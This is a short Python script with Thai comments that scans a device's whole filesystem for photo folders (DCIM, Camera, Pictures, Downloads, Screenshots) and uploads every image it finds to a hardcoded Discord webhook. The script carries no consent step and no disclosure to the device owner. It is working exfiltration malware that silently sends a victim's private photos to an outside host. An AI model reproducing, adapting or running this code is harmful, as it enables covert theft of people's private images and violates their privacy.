import os
from pathlib import Path
import requests
import mimetypes

# ใส่ webhook ของคุณตรงนี้
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1430032843664392285/jSQpCp6bVM-p1Yz12wzBB0F_yqmAz70G1G3MRO9hpcTHoimaimkUSvvmX99OzpGYH8_O"

# โฟลเดอร์ที่มักมีรูป
COMMON_FOLDERS = [
    "DCIM", "Camera", "Pictures", "Download", "Downloads", "Screenshots"
]

def find_image_folders(base_path="/"):
    """ค้นหาโฟลเดอร์ที่มีไฟล์รูปภาพ"""
    found_folders = []
    for root, dirs, files in os.walk(base_path):
        for folder in COMMON_FOLDERS:
            if folder.lower() in root.lower():
                if any(f.lower().endswith((".jpg", ".jpeg", ".png", ".gif")) for f in files):
                    found_folders.append(root)
        # จำกัดความลึกไม่ให้สแกนทั้งระบบ (เร็วขึ้น)
        if len(found_folders) > 10:
            break
    return list(set(found_folders))

def send_image_to_discord(file_path):
    """อัปโหลดไฟล์รูปภาพไปยัง Discord Webhook"""
    mime_type, _ = mimetypes.guess_type(file_path)
    if not mime_type:
        mime_type = "application/octet-stream"

    with open(file_path, "rb") as f:
        files = {"file": (os.path.basename(file_path), f, mime_type)}
        requests.post(WEBHOOK_URL, files=files)

def main():
    print("🔍 กำลังค้นหารูปในเครื่อง...")

    # ลองค้นหาใน path หลักที่พบบ่อย
    possible_drives = [
        "/",  # Android / Linux
        str(Path.home()),  # Windows เช่น C:\Users\ชื่อ\
        "C:\\Users", "D:\\", "E:\\"
    ]

    image_folders = []
    for base in possible_drives:
        if os.path.exists(base):
            image_folders.extend(find_image_folders(base))

    if not image_folders:
        print("❌ ไม่พบโฟลเดอร์ที่มีรูปเลย")
        return

    print("📸 พบโฟลเดอร์รูป:", image_folders)

    for folder in image_folders:
        for file in os.listdir(folder):
            if file.lower().endswith((".jpg", ".jpeg", ".png", ".gif")):
                path = os.path.join(folder, file)
                print("📤 ส่งรูป:", path)
                send_image_to_discord(path)

    print("✅ เสร็จสิ้น!")

if __name__ == "__main__":
    main()
